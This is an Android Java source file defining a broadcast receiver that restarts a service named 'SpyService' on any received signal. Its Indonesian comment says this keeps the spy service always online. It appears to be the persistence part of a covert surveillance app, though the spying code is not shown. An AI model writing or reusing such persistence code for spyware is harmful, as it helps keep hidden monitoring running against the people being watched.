package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class RestarterReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("RestarterReceiver", "Sinyal diterima: " + intent.getAction());

        // Memicu SpyService agar selalu online
        Intent serviceIntent = new Intent(context, SpyService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Android 8.0+ memerlukan startForegroundService
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }
    }
}